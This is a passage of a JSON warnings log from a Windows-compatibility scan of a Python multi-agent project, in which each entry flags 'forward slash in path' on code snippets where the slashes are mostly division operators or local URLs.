        "warning": "Line 1467: Forward slash in path - \": min(100, self.roi_metrics.roi_percentage / 10)  # Scale to 0-100\n            }\n        }\n    \n    async def shutdown(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.282836"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 320: Forward slash in path - \"\n        \n        # Determine target scaling\n        if target_agent_count:\n            # Calculate required instances based on agent count\n            agents_per_instance = 100  # Approximate capacity per instance\n            target_instances = max(1, (target_agent_count + agents_per_instance - 1) // agents_per_instance)\n        \n        target_instances = target_instances or self.config.max_instances\n        target_instances = min(target_instances, self.config.max_instances)\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.283689"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 550: Forward slash in path - \": {}\n        }\n        \n        try:\n            # Check system resources\n            cpu_count = psutil.cpu_count()\n            memory_gb = psutil.virtual_memory().total / (1024**3)\n            disk_space_gb = psutil.disk_usage('",
        "timestamp": "2025-09-05T17:30:42.283842"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 557: Forward slash in path - ').free / (1024**3)\n            \n            if cpu_count < self.config.cpu_cores:\n                validation_results[\"",
        "timestamp": "2025-09-05T17:30:42.283863"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 621: Forward slash in path - ':  # Unix/Linux systems\n            signal.signal(signal.SIGTERM, self._handle_shutdown_signal)\n            signal.signal(signal.SIGINT, self._handle_shutdown_signal)\n        \n        logger.info(\"",
        "timestamp": "2025-09-05T17:30:42.283927"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 932: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.284153"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 962: Forward slash in path - \"\n        \n        days = int(seconds // 86400)\n        hours = int((seconds % 86400) // 3600)\n        minutes = int((seconds % 3600) // 60)\n        secs = int(seconds % 60)\n        \n        if days > 0:\n            return f\"",
        "timestamp": "2025-09-05T17:30:42.284199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "warning": "Line 1002: Forward slash in path - \"\n        uptime_percentage = min(99.9, (self.deployment_status.uptime_seconds / (24 * 3600)) * 99.9)  # Simplified\n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.284251"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 292: Forward slash in path - \")\n        \n        discovered_opportunities = []\n        \n        # Strategy 1: Performance gap analysis\n        performance_opportunities = await self._discover_performance_gaps()\n        discovered_opportunities.extend(performance_opportunities)\n        \n        # Strategy 2: Cross-system synergy analysis\n        synergy_opportunities = await self._discover_cross_system_synergies()\n        discovered_opportunities.extend(synergy_opportunities)\n        \n        # Strategy 3: Inefficiency pattern detection\n        inefficiency_opportunities = await self._discover_inefficiency_patterns()\n        discovered_opportunities.extend(inefficiency_opportunities)\n        \n        # Strategy 4: Innovation potential analysis\n        innovation_opportunities = await self._discover_innovation_potential()\n        discovered_opportunities.extend(innovation_opportunities)\n        \n        # Strategy 5: Meta-learning insights\n        if self.meta_learning_enabled:\n            meta_opportunities = await self._discover_meta_learning_opportunities()\n            discovered_opportunities.extend(meta_opportunities)\n        \n        # Filter and prioritize opportunities\n        filtered_opportunities = await self._filter_and_prioritize_opportunities(discovered_opportunities)\n        \n        # Update metrics\n        self.evolution_metrics.total_improvements_discovered += len(filtered_opportunities)\n        self.evolution_metrics.discovery_rate = len(filtered_opportunities) / max(1, self.current_generation)\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.285407"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 325: Forward slash in path - \"Discovery rate: {self.evolution_metrics.discovery_rate:.2f} improvements/generation\"",
        "timestamp": "2025-09-05T17:30:42.285425"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 459: Forward slash in path - '] / len(target_systems)\n            \n            if success_rate < 0.5:  # Less than 50% success\n                logger.warning(f\"",
        "timestamp": "2025-09-05T17:30:42.285530"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 481: Forward slash in path - ', False)])\n                    improvement.success_rate = success_count / len(improvement.test_results)\n                \n                # Add to improvement history\n                self.improvement_history.append(improvement)\n                \n                # Update evolution metrics\n                self.evolution_metrics.successful_improvements += 1\n                self.evolution_metrics.cumulative_improvement += improvement.actual_improvement\n            \n            logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.285571"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 493: Forward slash in path - ']}/{len(target_systems)}\"",
        "timestamp": "2025-09-05T17:30:42.285592"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 608: Forward slash in path - ': 0.8}\n                \n                # Compare with baseline\n                baseline = self.system_performance_baselines.get(system_name, {})\n                \n                for metric_name, current_value in current_metrics.items():\n                    baseline_value = baseline.get(metric_name, 0.8)\n                    \n                    # Identify performance gaps\n                    if isinstance(current_value, (int, float)):\n                        performance_gap = 1.0 - (current_value / max(baseline_value, 0.1))\n                        \n                        if performance_gap > 0.1:  # 10% gap threshold\n                            opportunity = EvolutionaryImprovement(\n                                improvement_id=f\"",
        "timestamp": "2025-09-05T17:30:42.285696"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 808: Forward slash in path - \"\n        \n        if not self.improvement_population:\n            return []\n        \n        # Calculate fitness scores\n        for improvement in self.improvement_population:\n            improvement.fitness_score = await self._calculate_fitness_score(improvement)\n        \n        # Sort by fitness (descending)\n        sorted_population = sorted(\n            self.improvement_population, \n            key=lambda x: x.fitness_score, \n            reverse=True\n        )\n        \n        # Select top performers (elitism) + tournament selection\n        elite_count = max(1, int(len(sorted_population) * self.elitism_rate))\n        elite_improvements = sorted_population[:elite_count]\n        \n        # Tournament selection for remaining slots\n        selection_count = min(self.population_size // 2, len(sorted_population))\n        tournament_selections = []\n        \n        for _ in range(selection_count - elite_count):\n            tournament_size = min(5, len(sorted_population))\n            tournament = random.sample(sorted_population, tournament_size)\n            winner = max(tournament, key=lambda x: x.fitness_score)\n            tournament_selections.append(winner)\n        \n        selected = elite_improvements + tournament_selections\n        \n        logger.debug(f\"",
        "timestamp": "2025-09-05T17:30:42.285868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 1168: Forward slash in path - ']\n        \n        # Update improvement trend\n        current_improvement = sum(imp.actual_improvement for imp in self.improvement_history) / max(1, len(self.improvement_history))\n        self.evolution_metrics.improvement_trend.append(current_improvement)\n        \n        # Calculate quarterly improvement\n        if len(self.evolution_metrics.improvement_trend) >= 10:  # Enough data points\n            recent_trend = list(self.evolution_metrics.improvement_trend)[-10:]\n            self.evolution_metrics.quarterly_improvement = statistics.mean(recent_trend)\n    \n    async def _initialize_evolution_population(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.286130"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 1199: Forward slash in path - \"Target achievement: {(self.evolution_metrics.quarterly_improvement / self.target_improvement_rate) * 100:.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.286181"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "warning": "Line 1307: Forward slash in path - ': (self.evolution_metrics.quarterly_improvement / self.target_improvement_rate) * 100\n            },\n            '",
        "timestamp": "2025-09-05T17:30:42.286301"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Line 56: Forward slash in path - \"                 # Mixed autonomous/traditional\n    TRADITIONAL = \"",
        "timestamp": "2025-09-05T17:30:42.286899"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Line 590: Forward slash in path - \")\n        \n        # Scale orchestrator capacity\n        scaling_result = await self.autonomous_orchestrator.scale_operations(\n            target_agent_count=target_agent_count,\n            enable_load_balancing=True,\n            enable_resource_optimization=True\n        )\n        \n        # Scale reasoning controller\n        await self.reasoning_controller.scale_concurrent_tasks(\n            max_tasks=min(target_agent_count // 10, self.config.max_reasoning_tasks)\n        )\n        \n        # Scale security monitoring\n        await self.security_framework.scale_monitoring(target_agent_count)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.287314"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Line 720: Forward slash in path - \"\n        \n        complexity_factors = []\n        \n        # Description complexity\n        word_count = len(task.description.split())\n        complexity_factors.append(min(1.0, word_count / 50.0))\n        \n        # Requirements complexity\n        req_count = len(task.requirements)\n        complexity_factors.append(min(1.0, req_count / 10.0))\n        \n        # Dependency complexity\n        dep_count = len(task.dependencies)\n        complexity_factors.append(min(1.0, dep_count / 5.0))\n        \n        # Keywords indicating complexity\n        complex_keywords = ['",
        "timestamp": "2025-09-05T17:30:42.287430"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\master_controller.py",
        "warning": "Line 737: Forward slash in path - ']\n        keyword_score = sum(1 for keyword in complex_keywords if keyword in task.description.lower())\n        complexity_factors.append(min(1.0, keyword_score / len(complex_keywords)))\n        \n        return sum(complexity_factors) / len(complexity_factors)\n    \n    async def _simulate_human_oversight(self, recommendation: Dict[str, Any]) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.287476"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
        "warning": "Line 355: Forward slash in path - \"]) for r in responses)\n        consensus_ratio = 1.0 / len(unique_responses)\n        \n        return consensus_ratio >= threshold\n    \n    async def _synthesize_conversation(self, conversation: List[Dict]) -> Any:\n        \"",
        "timestamp": "2025-09-05T17:30:42.288460"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
        "warning": "Line 461: Forward slash in path - \"\n        # Simplified fitness evaluation\n        # In practice, would implement domain-specific fitness function\n        return hash(str(solution)) % 100 / 100.0\n    \n    async def _check_swarm_convergence(self, swarm: List[BaseAgent]) -> bool:\n        \"",
        "timestamp": "2025-09-05T17:30:42.288531"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
        "warning": "Line 539: Forward slash in path - 's task history\n            success_by_type = defaultdict(list)\n            \n            for obs in agent.memory.episodic_memory:\n                task_type = obs.action.action_type\n                success_by_type[task_type].append(obs.success)\n            \n            # Find specialization\n            best_type = None\n            best_rate = 0\n            \n            for task_type, successes in success_by_type.items():\n                if successes:\n                    rate = sum(successes) / len(successes)\n                    if rate > best_rate:\n                        best_rate = rate\n                        best_type = task_type\n            \n            if best_type and best_rate > 0.7:\n                specializations[agent_name] = best_type\n        \n        if specializations:\n            return [{\n                \"",
        "timestamp": "2025-09-05T17:30:42.288590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 53: Forward slash in path - \"redis://localhost:6379\"",
        "timestamp": "2025-09-05T17:30:42.289130"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 208: Forward slash in path - ': lambda x: sum(m.importance for m in x)/len(x)}\n            )\n            \n            for group_type, group_data in memory_groups.items():\n                task = self.async_optimizer.execute_with_concurrency_limit(\n                    self._consolidate_memory_group(group_data['",
        "timestamp": "2025-09-05T17:30:42.289225"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 340: Forward slash in path - \"postgresql://localhost/agent_coordination\"",
        "timestamp": "2025-09-05T17:30:42.289306"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 351: Forward slash in path - '1000+ messages/second'",
        "timestamp": "2025-09-05T17:30:42.289323"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 383: Forward slash in path - \"\n        ])\n        \n        # Wait for optimizations to take effect\n        await asyncio.sleep(5.0)\n        \n        after_score = await self.get_current_performance_score()\n        optimization_time = time.perf_counter() - start_time\n        \n        improvement = after_score / max(1, before_score)\n        \n        recommendations = await self._generate_recommendations(after_score)\n        \n        result = OptimizationResult(\n            performance_score_before=before_score,\n            performance_score_after=after_score,\n            optimization_time=optimization_time,\n            optimizations_applied=optimizations_applied,\n            performance_improvement=improvement,\n            recommendations=recommendations\n        )\n        \n        self.optimization_history.append(result)\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.289363"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "warning": "Line 425: Forward slash in path - \"postgresql://localhost/phase7\"",
        "timestamp": "2025-09-05T17:30:42.289386"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 183: Forward slash in path - ': len(self.relationships) / max(1, len(self.nodes) * (len(self.nodes) - 1) / 2),\n            '",
        "timestamp": "2025-09-05T17:30:42.290075"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 674: Forward slash in path - \"\n        \n        # Count votes for each potential relationship\n        relationship_votes = defaultdict(list)\n        \n        for results in algorithm_results:\n            for rel in results:\n                key = (rel.cause_variable, rel.effect_variable)\n                relationship_votes[key].append(rel)\n        \n        # Create ensemble graph with relationships that have majority vote\n        ensemble_graph = CausalGraph()\n        min_votes = len(algorithm_results) // 2 + 1  # Majority threshold\n        \n        for (cause, effect), votes in relationship_votes.items():\n            if len(votes) >= min_votes:\n                # Combine evidence from multiple algorithms\n                combined_rel = await self._combine_relationship_evidence(votes)\n                ensemble_graph.add_relationship(combined_rel)\n        \n        logger.info(f\"",
        "timestamp": "2025-09-05T17:30:42.290377"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 720: Forward slash in path - \"\n        \n        if not self.time_series_data or len(graph.relationships) == 0:\n            return 0.0\n        \n        # Split data for cross-validation\n        accuracies = []\n        \n        for fold in range(self.validation_splits):\n            # Create train/test split\n            train_data, test_data = await self._create_data_split(fold)\n            \n            # Predict relationships on test data\n            predictions = []\n            ground_truth = []\n            \n            for relationship in graph.relationships:\n                # Predict relationship strength on test data\n                predicted_strength = await self._predict_relationship_strength(\n                    relationship, test_data\n                )\n                predictions.append(predicted_strength > 0.5)\n                ground_truth.append(relationship.strength > 0.5)\n            \n            if predictions and ground_truth:\n                fold_accuracy = accuracy_score(ground_truth, predictions)\n                accuracies.append(fold_accuracy)\n        \n        average_accuracy = np.mean(accuracies) if accuracies else 0.0\n        self.validation_results['",
        "timestamp": "2025-09-05T17:30:42.290427"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 1140: Forward slash in path - \"\n        # Simplified BIC calculation\n        n_edges = len(graph.relationships)\n        n_variables = len(variables)\n        n_data = sum(len(data) for data in self.time_series_data.values())\n        \n        if n_data == 0:\n            return 0.0\n        \n        # BIC = log-likelihood - (k/2) * log(n)\n        # Simplified approximation\n        log_likelihood = -n_edges * 10  # Penalty for complexity\n        penalty = (n_edges / 2) * np.log(n_data)\n        \n        return log_likelihood - penalty\n    \n    async def _test_non_gaussianity(self, cause_var: str, effect_var: str) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.290667"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 1196: Forward slash in path - \"Create train/test split for cross-validation\"",
        "timestamp": "2025-09-05T17:30:42.290719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 1196: Forward slash in path - \"\n        train_data = {}\n        test_data = {}\n        \n        for var, data in self.time_series_data.items():\n            if len(data) < self.validation_splits:\n                train_data[var] = data\n                test_data[var] = []\n                continue\n            \n            # Split data into folds\n            fold_size = len(data) // self.validation_splits\n            start_idx = fold * fold_size\n            end_idx = (fold + 1) * fold_size if fold < self.validation_splits - 1 else len(data)\n            \n            test_data[var] = data[start_idx:end_idx]\n            train_data[var] = data[:start_idx] + data[end_idx:]\n        \n        return train_data, test_data\n    \n    async def _predict_relationship_strength(self, relationship: CausalRelationship, test_data: Dict) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.290758"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 1241: Forward slash in path - ': min(1.0, relationship.effect_size / 0.8),  # Normalize large effects\n            '",
        "timestamp": "2025-09-05T17:30:42.290802"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\causal_inference.py",
        "warning": "Line 1278: Forward slash in path - \"\n        factors = [\n            relationship.confidence,\n            1.0 - relationship.statistical_significance,\n            min(1.0, relationship.effect_size),\n            len(relationship.evidence_sources) / 5.0  # More sources = better\n        ]\n        \n        avg_quality = np.mean(factors)\n        \n        if avg_quality < 0.5:\n            return \"",
        "timestamp": "2025-09-05T17:30:42.290866"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 484: Forward slash in path - \"\n        \n        # Initialize both systems\n        session_id = await self.working_memory.start_reasoning_session(task.session_id)\n        \n        # Parallel analysis with causal and temporal systems\n        causal_task = asyncio.create_task(\n            self._causal_focused_reasoning(task)\n        )\n        \n        temporal_task = asyncio.create_task(\n            self._temporal_focused_reasoning(task)\n        )\n        \n        # Wait for both analyses\n        causal_result, temporal_result = await asyncio.gather(causal_task, temporal_task)\n        \n        # Combine insights for enhanced predictions\n        combined_insights = await self._combine_causal_temporal_insights(\n            causal_result.causal_insights,\n            temporal_result.temporal_insights,\n            task\n        )\n        \n        # Generate integrated predictions\n        integrated_predictions = await self._generate_integrated_predictions(\n            combined_insights, task.context\n        )\n        \n        result = IntegratedReasoningResult(\n            task_id=task.task_id,\n            success=True,\n            reasoning_mode=task.reasoning_mode,\n            primary_solution=integrated_predictions,\n            confidence=(causal_result.confidence + temporal_result.confidence) / 2,\n            causal_insights=causal_result.causal_insights,\n            temporal_insights=temporal_result.temporal_insights,\n            accuracy_achieved=max(causal_result.accuracy_achieved, temporal_result.accuracy_achieved),\n            systems_utilized=['",
        "timestamp": "2025-09-05T17:30:42.291609"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 643: Forward slash in path - ', 0.0) for link in reasoning_path.causal_chain) / len(reasoning_path.causal_chain),\n                    '",
        "timestamp": "2025-09-05T17:30:42.291717"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 732: Forward slash in path - '] = (causal_conf + temporal_conf) / 2\n        \n        # Identify key relationships that appear in both analyses\n        # This would involve more sophisticated cross-system analysis\n        # For now, provide basic integration\n        combined['",
        "timestamp": "2025-09-05T17:30:42.291808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 883: Forward slash in path - '] - 1)) + \n                       result.accuracy_achieved) / self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.291935"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 889: Forward slash in path - '] - 1)) + \n                   result.processing_time) / self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.291968"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 905: Forward slash in path - '] = result.memory_coherence\n        \n        # Token efficiency\n        if result.tokens_used > 0:\n            efficiency = min(1.0, task.max_tokens / result.tokens_used)\n            self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.292010"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\integrated_reasoning_controller.py",
        "warning": "Line 992: Forward slash in path - '] / max(1, self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.292095"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "warning": "Line 396: Forward slash in path - \"\n        data1 = self.time_series_data.get(var1, np.array([]))\n        data2 = self.time_series_data.get(var2, np.array([]))\n        timestamps1 = self.data_timestamps.get(var1, np.array([]))\n        timestamps2 = self.data_timestamps.get(var2, np.array([]))\n        \n        if len(data1) == 0 or len(data2) == 0:\n            return 0.5  # No preference\n        \n        # Simple lag correlation test\n        min_length = min(len(data1), len(data2), 50)  # Limit for performance\n        \n        if min_length < 10:\n            return 0.5\n        \n        # Use only recent data for speed\n        recent_data1 = data1[-min_length:]\n        recent_data2 = data2[-min_length:]\n        \n        # Test correlation with lag\n        if min_length > 2:\n            lagged_corr_12 = np.corrcoef(recent_data1[:-1], recent_data2[1:])[0, 1]\n            lagged_corr_21 = np.corrcoef(recent_data2[:-1], recent_data1[1:])[0, 1]\n            \n            lagged_corr_12 = 0.0 if np.isnan(lagged_corr_12) else abs(lagged_corr_12)\n            lagged_corr_21 = 0.0 if np.isnan(lagged_corr_21) else abs(lagged_corr_21)\n            \n            # Return normalized direction score\n            total = lagged_corr_12 + lagged_corr_21\n            if total > 0:\n                return lagged_corr_12 / total\n        \n        return 0.5  # Default: no clear direction\n    \n    async def _optimized_granger_causality(self) -> List[OptimizedCausalRelationship]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.292581"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "warning": "Line 453: Forward slash in path - \"\n        cause_data = self.time_series_data.get(cause_var, np.array([]))\n        effect_data = self.time_series_data.get(effect_var, np.array([]))\n        \n        if len(cause_data) < 10 or len(effect_data) < 10:\n            return 0.0\n        \n        # Use limited recent data for speed\n        max_length = 100\n        min_length = min(len(cause_data), len(effect_data), max_length)\n        \n        cause_recent = cause_data[-min_length:]\n        effect_recent = effect_data[-min_length:]\n        \n        # Simple lagged correlation as Granger approximation\n        if min_length > 5:\n            # Test multiple lags efficiently\n            max_lags = min(5, min_length // 3)\n            lag_correlations = []\n            \n            for lag in range(1, max_lags + 1):\n                if min_length > lag:\n                    lagged_corr = np.corrcoef(\n                        cause_recent[:-lag],\n                        effect_recent[lag:]\n                    )[0, 1]\n                    \n                    if not np.isnan(lagged_corr):\n                        lag_correlations.append(abs(lagged_corr))\n            \n            if lag_correlations:\n                return max(lag_correlations)  # Best lag correlation\n        \n        return 0.0\n    \n    async def _optimized_transfer_entropy(self) -> List[OptimizedCausalRelationship]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.292625"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "warning": "Line 510: Forward slash in path - \"\n        cause_data = self.time_series_data.get(cause_var, np.array([]))\n        effect_data = self.time_series_data.get(effect_var, np.array([]))\n        \n        if len(cause_data) < 20 or len(effect_data) < 20:\n            return 0.0\n        \n        # Simplified mutual information calculation\n        max_length = 50  # Limit for performance\n        min_length = min(len(cause_data), len(effect_data), max_length)\n        \n        # Use recent data\n        cause_recent = cause_data[-min_length:]\n        effect_recent = effect_data[-min_length:]\n        \n        # Discretize for mutual information calculation\n        n_bins = min(10, min_length // 3)\n        \n        try:\n            # Simple histogram-based mutual information\n            cause_binned = np.digitize(cause_recent, np.histogram(cause_recent, bins=n_bins)[1])\n            effect_binned = np.digitize(effect_recent, np.histogram(effect_recent, bins=n_bins)[1])\n            \n            # Calculate joint entropy approximation\n            joint_hist = np.histogram2d(cause_binned, effect_binned, bins=n_bins)[0]\n            joint_hist = joint_hist / joint_hist.sum()\n            joint_hist = joint_hist[joint_hist > 0]  # Remove zeros\n            \n            if len(joint_hist) > 0:\n                joint_entropy = -np.sum(joint_hist * np.log2(joint_hist + 1e-10))\n                return min(1.0, joint_entropy / 10.0)  # Normalize\n        \n        except Exception:\n            pass\n        \n        return 0.0\n    \n    async def _optimized_ensemble_combination(self, algorithm_results: List[List[OptimizedCausalRelationship]]) -> HighPerformanceCausalGraph:\n        \"",
        "timestamp": "2025-09-05T17:30:42.292665"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "warning": "Line 548: Forward slash in path - \"\n        \n        # Use dict for O(1) lookup and counting\n        relationship_votes: Dict[Tuple[str, str], List[OptimizedCausalRelationship]] = defaultdict(list)\n        \n        # Collect votes efficiently\n        for results in algorithm_results:\n            for relationship in results:\n                key = (relationship.cause_variable, relationship.effect_variable)\n                relationship_votes[key].append(relationship)\n        \n        # Create ensemble graph\n        ensemble_graph = HighPerformanceCausalGraph()\n        \n        # Use majority voting with optimized processing\n        min_votes = max(1, len(algorithm_results) // 2)  # Majority threshold\n        \n        for (cause, effect), votes in relationship_votes.items():\n            if len(votes) >= min_votes:\n                # Combine evidence efficiently\n                avg_strength = sum(rel.strength for rel in votes) / len(votes)\n                avg_confidence = sum(rel.confidence for rel in votes) / len(votes)\n                \n                # Boost confidence for unanimous votes\n                confidence_boost = 1.0 + (len(votes) - min_votes) * 0.1\n                final_confidence = min(0.95, avg_confidence * confidence_boost)\n                \n                combined_relationship = OptimizedCausalRelationship(\n                    cause_variable=cause,\n                    effect_variable=effect,\n                    strength=avg_strength,\n                    confidence=final_confidence\n                )\n                \n                ensemble_graph.add_relationship(combined_relationship)\n        \n        logger.debug(f\"",
        "timestamp": "2025-09-05T17:30:42.292697"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
